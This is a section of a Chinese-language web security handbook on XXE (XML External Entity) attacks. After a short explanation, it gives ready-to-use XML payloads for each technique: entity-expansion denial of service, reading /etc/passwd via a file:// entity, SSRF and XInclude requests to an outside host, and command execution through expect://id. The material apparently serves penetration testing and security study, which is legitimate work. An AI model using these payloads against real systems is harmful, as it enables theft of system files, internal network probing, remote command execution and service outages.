# XXE

### 4.10.3. XXE

当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。

### 4.10.4. 攻击方式

#### 4.10.4.1. 拒绝服务攻击

```
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```

若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。

#### 4.10.4.2. 文件读取

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

#### 4.10.4.3. SSRF

```
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>
```

#### 4.10.4.4. RCE

```
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
```

#### 4.10.4.5. XInclude

```
<?xml version='1.0'?>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
```

***
